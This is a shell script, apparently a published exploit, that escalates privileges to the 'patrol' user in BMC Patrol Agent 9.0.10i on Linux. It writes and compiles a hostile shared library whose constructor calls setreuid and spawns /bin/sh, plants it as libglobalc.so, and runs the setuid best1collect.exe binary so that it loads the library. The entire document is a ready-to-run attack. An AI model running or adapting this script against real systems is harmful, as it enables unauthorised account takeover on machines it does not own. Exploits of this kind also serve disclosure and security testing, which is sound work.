#!/bin/sh

# Exploit Title: BMC Patrol for Linux: privilege escalation to "patrol" user via best1collect.exe setuid binary 
# Date: 3/07/2019
# Exploit Author: blogresponder (https://github.com/blogresponder)
# Greetz : itm4n (https://github.com/itm4n)
# Vendor Homepage: http://www.bmc.com/
# Version: PatrolAgent V9.0.10i
# Tested on: RHEL x64 

BIN='/users/patrol/Patrol3/Linux-2-6-x86-64/best1/9.0.00/bgs/bin/best1collect.exe'
LIB='libglobalc.so'
TMP='/tmp/'
UID_OF_PATROL_USER=$(cat /etc/passwd | grep patrol | tr ':' ' ' | awk '{print $3}')

echo "[*] Patrol user UID found : $UID_OF_PATROL_USER"

if [ -z $UID_OF_PATROL_USER ];
then
	echo "Not valid UID."
	echo ""
	exit;
fi

echo "[*] Patrol user UID found : $UID_OF_PATROL_USER"

if [ ! -f $BIN ];
then
  echo "[-] '$BIN' doesn't exist! Exiting..." && exit 
fi

if [ -f $LIB ];
then
  echo "[-] '$LIB' already exists in the current folder! Exiting..." && exit
fi
 
echo "[*] Current user: '$(whoami)'"

payload_name=$(head /dev/urandom | md5sum | cut -c1-12)
echo "[*] Writing '$TMP$payload_name.c'..."
cat > "$TMP$payload_name.c" <<- EOM
#include<stdio.h>
#include<stdlib.h>
static void so_hijacking() __attribute__((constructor));
void so_hijacking() {
  setreuid($UID_OF_PATROL_USER, -1);
  system("/bin/sh");
  exit(0);
}
void GetSysInfo() { }
EOM

echo "[*] Compiling $TMP$payload_name.so..."
gcc -shared -o "$TMP$payload_name.so" -fPIC "$TMP$payload_name.c" 2>/dev/null

if [ $? -eq 0 ];
then 
  echo "[+] '$TMP$payload_name.so' has been successfully created."
  echo "[*] Copying '$TMP$payload_name.so' to './$LIB'"
  cp "$TMP$payload_name.so" $LIB
  echo "[*] Executing vulnerable binary..."
  echo "[+] Should be 'patrol' now."
  $BIN
else
  echo "[-] Compilation failed! "
fi

echo "[*] Deleting temp files..."
if [ -f "$TMP$payload_name.so" ]; then rm "$TMP$payload_name.so"; fi
if [ -f "$TMP$payload_name.c" ]; then rm "$TMP$payload_name.c"; fi
if [ -f "$LIB" ]; then rm "$LIB"; fi
